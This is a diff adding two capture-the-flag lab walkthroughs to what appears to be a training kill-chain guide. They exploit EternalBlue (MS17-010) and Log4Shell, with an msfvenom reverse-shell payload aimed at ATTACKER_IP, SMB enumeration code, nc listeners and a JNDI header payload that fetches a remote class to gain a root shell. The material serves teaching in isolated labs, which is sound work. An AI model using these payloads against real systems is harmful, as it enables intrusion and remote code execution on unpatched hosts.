@@ -1531,7 +1531,391 @@ sudo nc -lvnp 80 | grep "X-Flag"
 
 ---
 
-<!-- CVE-01..04 kill-chains appended by Plans 02–03 -->
+### CVE-01: EternalBlue — MS17-010
+
+**VMs:** Attacker (Kali), Victim (Windows 7 SP1 x64 / Server 2008 R2 x64, SMBv1 enabled, pre-MS17-010)
+**Difficulty:** Hard
+**Flags:** 1
+
+EternalBlue exploits a buffer overflow in the SMBv1 `SrvOs2FeaToNt` function: a crafted TRANS2 request causes a kernel pool overflow that injects the DOUBLEPULSAR backdoor ring-0 implant, through which arbitrary shellcode runs as SYSTEM. Students implement the heap-grooming and payload-injection class from scratch using the pre-staged SMBv1 protocol helper — building hands-on understanding of the Windows kernel pool layout that made this exploit possible.
+
+**Pre-staged on attacker VM:** `mysmb.py` (SMBv1 protocol helper — connection setup, named pipe access, raw transaction sending) and FEA struct templates.
+**Student authors (~40–60 lines):** the weaponization class — SMBv1 negotiate and session setup, TRANS2/NT_TRANSACT heap grooming (FEA list overflow), DOUBLEPULSAR ping check, and shellcode injection via DOUBLEPULSAR.
+
+> **OS target constraint:** EternalBlue targets the specific kernel pool layout of the **unpatched** SMBv1 driver in Windows 7 SP1 x64 and Windows Server 2008 R2 x64 (pre-MS17-010, released March 2017). Running this exploit against a patched system or against Windows 10 / Server 2016 will cause an immediate kernel pool corruption that **BSODs and reboots the victim VM**. Verify the target OS and patch state with the Stage 1 nmap scripts before running the exploit. If the target becomes unreachable within 2–3 seconds of exploit execution, you have hit a patched or wrong-version target.
+
+---
+
+#### Pre-flight: Shellcode Generation
+
+**Action:** You generate a raw reverse-shell payload using msfvenom that the exploit will inject into the victim kernel.
+
+**Command:**
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT \
+  -f raw -e x64/xor_dynamic -b '\x00' -o shellcode.bin
+```
+
+**Expected Output:**
+```
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+Found 1 compatible encoders
+...
+Payload size: 511 bytes
+Saved as: shellcode.bin
+```
+
+**TTP:** —
+
+---
+
+#### Stage 1: SMBv1 Service Fingerprinting
+
+**Action:** You enumerate port 445 and confirm that the target is running an unpatched SMBv1 implementation vulnerable to MS17-010.
+
+**Command:**
+```bash
+nmap -p 445 --script smb-security-mode,smb-vuln-ms17-010 VICTIM_IP
+```
+
+**Expected Output:**
+```
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-security-mode:
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|_    Risk factor: HIGH
+```
+
+**TTP:** [T1046 — Network Service Discovery](https://attack.mitre.org/techniques/T1046/) · Discovery
+
+---
+
+#### Stage 2: Named Pipe Enumeration
+
+**Action:** You enumerate accessible SMB named pipes on the target to identify a pipe that the exploit can use to send the grooming transactions.
+
+**Command:**
+```bash
+python3 -c "
+import mysmb
+conn = mysmb.SMB(target_ip='VICTIM_IP', target_name='VICTIM_IP')
+conn.login('', '')
+tid = conn.tree_connect_andx(r'\\\\VICTIM_IP\\IPC\$')
+for pipe in ['\BROWSER', '\spoolss', '\netlogon', '\samr', '\lsarpc']:
+    try:
+        fid = conn.nt_create_andx(tid, pipe)
+        print(f'[+] Accessible pipe: {pipe}')
+        conn.close_file(tid, fid)
+    except Exception as e:
+        print(f'[-] {pipe}: {e}')
+"
+
+# Alternative: use nmap to list SMB pipes
+nmap -p 445 --script smb-enum-pipes VICTIM_IP
+```
+
+**Expected Output:**
+```
+[+] Accessible pipe: \BROWSER
+[+] Accessible pipe: \spoolss
+[-] \netlogon: STATUS_OBJECT_NAME_NOT_FOUND
+```
+
+**TTP:** [T1135 — Network Share Discovery](https://attack.mitre.org/techniques/T1135/) · Discovery
+
+---
+
+#### Stage 3: Exploit Execution
+
+**Action:** You run the student-authored weaponization class against the target, triggering the SMBv1 heap-grooming sequence and deploying the DOUBLEPULSAR implant.
+
+**Command:**
+```bash
+python3 exploit.py VICTIM_IP shellcode.bin
+```
+
+**Expected Output:**
+```
+[*] Connecting to VICTIM_IP over SMB...
+[*] Negotiating SMBv1...
+[*] Sending TRANS2 grooming transactions...
+[*] Sending NT_TRANSACT overflow...
+[*] DOUBLEPULSAR implant detected — injecting shellcode...
+[*] Shellcode injected. Shell should arrive on listener.
+```
+
+**TTP:** [T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) · Initial Access
+
+---
+
+#### Stage 4: DOUBLEPULSAR Implant Verification
+
+**Action:** You confirm that DOUBLEPULSAR is resident in the victim kernel by sending the SMBv1 ping packet and observing the XOR-multiplied response signature.
+
+**Command:**
+```bash
+# The student-authored exploit.py includes a doublepulsar_ping() function.
+# Run the ping check independently to verify implant presence before shellcode injection:
+python3 -c "
+import mysmb
+conn = mysmb.SMB(target_ip='VICTIM_IP', target_name='VICTIM_IP')
+conn.login('', '')
+tid = conn.tree_connect_andx(r'\\\\VICTIM_IP\\IPC\$')
+fid = conn.nt_create_andx(tid, '\BROWSER')
+# DOUBLEPULSAR ping: send Trans2 SESSION_SETUP with Multiplex ID 0x0051
+# A response with Multiplex ID XOR'd by 0x4141414141414141 indicates active implant
+result = doublepulsar_ping(conn, tid, fid)
+print('[+] DOUBLEPULSAR active' if result else '[-] Implant not detected')
+"
+```
+
+**Expected Output:**
+```
+[+] DOUBLEPULSAR active
+```
+
+**TTP:** [T1106 — Native API](https://attack.mitre.org/techniques/T1106/) · Execution
+
+---
+
+#### Stage 5: Reverse Shell Receipt
+
+**Action:** You catch the reverse shell that the injected shellcode establishes, obtaining a SYSTEM-level command prompt on the victim.
+
+**Command:**
+```bash
+# Start the listener before running Stage 3:
+nc -lvnp ATTACKER_PORT
+```
+
+**Expected Output:**
+```
+Listening on 0.0.0.0 ATTACKER_PORT
+Connection received on VICTIM_IP [random port]
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+```
+
+**TTP:** [T1059.004 — Unix Shell](https://attack.mitre.org/techniques/T1059/004/) · Execution
+
+---
+
+### [FLAG 1] Stage 6: Flag Capture — Administrator Desktop
+
+**Action:** You retrieve Flag 1 from the Administrator's desktop using the SYSTEM shell obtained via EternalBlue.
+
+**Command:**
+```bash
+type C:\Users\Administrator\Desktop\flag.txt
+```
+
+**Expected Output:** `CTF{...flag_value_placeholder...}`
+
+**TTP:** — (flag capture, not an adversarial technique)
+
+---
+
+### CVE-02: Log4Shell — CVE-2021-44228
+
+**VMs:** Attacker (Kali), Victim (Ubuntu — ghcr.io/christophetd/log4shell-vulnerable-app, port 8080, JDK 1.8.0_181)
+**Difficulty:** Medium
+**Flags:** 1
+
+Log4Shell exploits Log4j 2.x JNDI lookup processing: a specially crafted `${jndi:ldap://...}` string embedded in any logged input causes the victim JVM to perform an outbound LDAP request. The attacker's LDAP server responds with a `SearchResultReference` referral pointing to a remote HTTP class server; the JVM fetches and instantiates the malicious `.class` file, executing arbitrary code. Students author both the LDAP referral logic and the HTTP class-serving handler — implementing the two-process attacker infrastructure that makes the chain work.
+
+**Pre-staged on attacker VM:** an LDAP server skeleton (`exploit_ldap.py`) providing ldap3-based socket setup and protocol framing (listen/accept loop and BER message scaffolding), and a pre-compiled `Exploit.class` reverse-shell payload.
+**Student authors (~30–50 lines):** the JNDI redirect logic — crafting the LDAP `SearchResultReference` response that points the JVM to the HTTP class server — and the HTTP handler (`exploit_http.py`) that serves the malicious `.class` file on port 8888.
+
+> **JDK version constraint:** JNDI remote classloading was disabled by default in **JDK 8u191** (October 2018) and all JDK 11+ releases. The victim image `ghcr.io/christophetd/log4shell-vulnerable-app` is pinned to **JDK 1.8.0_181**, which predates this restriction. Do not substitute a newer JVM or a different victim image — Log4j 2.14.1 will still process the JNDI lookup and send the LDAP request, but the JVM will refuse to fetch the remote `.class` file, and no HTTP request will arrive at your class server. Warning sign: you see the LDAP connection in your `exploit_ldap.py` terminal but no HTTP GET appears in your `exploit_http.py` terminal.
+
+---
+
+#### Stage 1: Vulnerability Discovery
+
+**Action:** You probe port 8080 and fingerprint the Log4j-vulnerable Spring Boot application to confirm the attack surface.
+
+**Command:**
+```bash
+curl -i http://VICTIM_IP:8080/
+
+# Probe for Log4j processing by injecting a benign JNDI string:
+curl -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:1389/test}' http://VICTIM_IP:8080/
+```
+
+**Expected Output:**
+```
+HTTP/1.1 200
+Content-Type: text/plain;charset=UTF-8
+...
+Hello, world!
+```
+
+**TTP:** [T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) · Initial Access
+
+---
+
+#### Stage 2: Reverse Shell Listener
+
+**Action:** You open the reverse shell listener that will catch the connection from the victim JVM when the malicious class executes.
+
+**Command:**
+```bash
+nc -lvnp 9001
+```
+
+**Expected Output:**
+```
+Listening on 0.0.0.0 9001
+```
+
+**TTP:** —
+
+---
+
+#### Stage 3: LDAP Exploit Server
+
+**Action:** You author and launch the LDAP redirect server that receives the victim JVM's JNDI lookup and responds with a `SearchResultReference` referral pointing to your HTTP class server.
+
+**Command:**
+```bash
+# exploit_ldap.py — student authors the SearchResultReference response body.
+# Pre-staged skeleton provides: ldap3 server-mode listen/accept loop and BER framing.
+# Student fills in: the referral URL in the SearchResultReference and the
+# javaCodeBase / javaFactory attributes that direct the JVM to fetch Exploit.class.
+
+python3 exploit_ldap.py ATTACKER_IP 1389 http://ATTACKER_IP:8888/
+```
+
+**Expected Output:**
+```
+[*] LDAP server listening on 0.0.0.0:1389
+```
+
+**TTP:** —
+
+---
+
+#### Stage 4: HTTP Class Server
+
+**Action:** You launch the HTTP handler that serves the pre-compiled `Exploit.class` payload when the victim JVM follows the LDAP referral.
+
+**Command:**
+```bash
+# exploit_http.py — student authors the request handler that returns Exploit.class
+# on GET /Exploit or GET /Exploit.class
+
+python3 exploit_http.py 8888
+```
+
+**Expected Output:**
+```
+[*] HTTP class server listening on 0.0.0.0:8888
+```
+
+**TTP:** —
+
+---
+
+#### Stage 5: JNDI Payload Injection
+
+**Action:** You send the `${jndi:ldap://...}` exploit string in the `X-Api-Version` HTTP request header, triggering Log4j's JNDI lookup on the victim.
+
+**Command:**
+```bash
+curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER_IP:1389/exploit}' \
+  http://VICTIM_IP:8080/
+```
+
+**Expected Output:**
+```
+HTTP/1.1 200
+...
+Hello, world!
+```
+
+**TTP:** [T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) · Initial Access
+
+---
+
+#### Stage 6: LDAP Referral and Classload Chain
+
+**Action:** You observe the two-step chain: the victim JVM connects to your LDAP server and receives the `SearchResultReference` referral, then fetches `Exploit.class` from your HTTP server — confirming the full JNDI classloading path before the shell arrives.
+
+**Command:**
+```bash
+# No new command — observe output in the Stage 3 and Stage 4 terminals simultaneously.
+```
+
+**Expected Output:**
+```
+# exploit_ldap.py terminal:
+[*] LDAP connection from VICTIM_IP
+[*] Sending SearchResultReference: http://ATTACKER_IP:8888/Exploit
+
+# exploit_http.py terminal:
+[*] GET /Exploit.class from VICTIM_IP — serving payload
+```
+
+**TTP:** [T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) · Initial Access
+
+---
+
+#### Stage 7: Reverse Shell Receipt
+
+**Action:** You catch the reverse shell that `Exploit.class` spawns inside the victim JVM process, gaining command execution on the victim container.
+
+**Command:**
+```bash
+# Shell arrives on the nc listener started in Stage 2.
+# Verify identity and environment:
+id
+hostname
+```
+
+**Expected Output:**
+```
+Connection received on VICTIM_IP [random port]
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+$ hostname
+log4shell-vulnerable-app
+```
+
+**TTP:** [T1059.004 — Unix Shell](https://attack.mitre.org/techniques/T1059/004/) · Execution
+
+---
+
+### [FLAG 1] Stage 8: Flag Capture — Container Filesystem
+
+**Action:** You retrieve Flag 1 from the victim container's filesystem using the reverse shell.
+
+**Command:**
+```bash
+find / -name "flag.txt" 2>/dev/null
+cat /root/flag.txt
+```
+
+**Expected Output:** `CTF{...flag_value_placeholder...}`
+
+**TTP:** — (flag capture, not an adversarial technique)
+
+---
+
+<!-- CVE-03..04 kill-chains appended by Plan 03 -->
 
 ---
 
@@ -1564,3 +1948,11 @@ The following checklist was applied before finalizing this document:
 | No automated exploit framework commands referenced anywhere in the document | PASS |
 | Actual flag stages by scenario: AD-01(1) + AD-02(1) + AD-03(1) + AD-04(1) + AD-05(2) + NET-01(1) + NET-02(1) + NET-03(1) + NET-04(1) = 10 | PASS |
 | `grep -c "^### \[FLAG [12]\]" docs/KILL-CHAINS.md` returns 10 | PASS |
+| Phase 3: Every CVE/CC stage has all four fields: Action, Command, Expected Output, TTP | PASS |
+| Phase 3: All command blocks use ALLCAPS placeholders — no hardcoded IPs/passwords | PASS |
+| Phase 3: No Metasploit references in any CVE or CC stage | PASS |
+| Phase 3: All CVE kill-chains explicitly identify pre-staged vs student-authored code | PASS |
+| Phase 3: CVE-01 and CVE-02 each contain exactly one `### [FLAG 1]` stage | PASS |
+| Phase 3: CVE-02 uses `X-Api-Version` header and `${jndi:ldap://...}` payload shape | PASS |
+| Phase 3: CVE-02 references `SearchResultReference` as the student-authored referral response | PASS |
+| Phase 3: CVE-02 cites JDK 1.8.0_181 constraint in inline warning | PASS |
